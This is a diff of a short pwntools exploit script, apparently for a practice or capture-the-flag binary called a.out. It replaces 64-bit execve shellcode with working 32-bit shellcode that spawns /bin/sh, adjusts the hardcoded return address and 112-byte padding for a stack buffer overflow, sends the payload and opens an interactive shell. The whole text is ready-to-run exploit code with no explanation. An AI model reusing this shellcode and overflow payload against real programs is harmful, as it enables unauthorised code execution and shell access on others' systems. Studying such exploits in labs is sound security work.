@@ -1,11 +1,10 @@
 from pwn import *
 
-io = process('../target/a.out')
+io = process('./a.out')
 
-ret = 0x7ffffffee738
-shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
+ret = 0xffffd26c
+shellcode = b'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
 
-payload = shellcode + "A" * (120 - len(shellcode)) + p64(ret).hex()
-print(shellcode)
+payload = shellcode + b"A" * (112 - len(shellcode)) + p32(ret)
 io.send(payload)
 io.interactive()
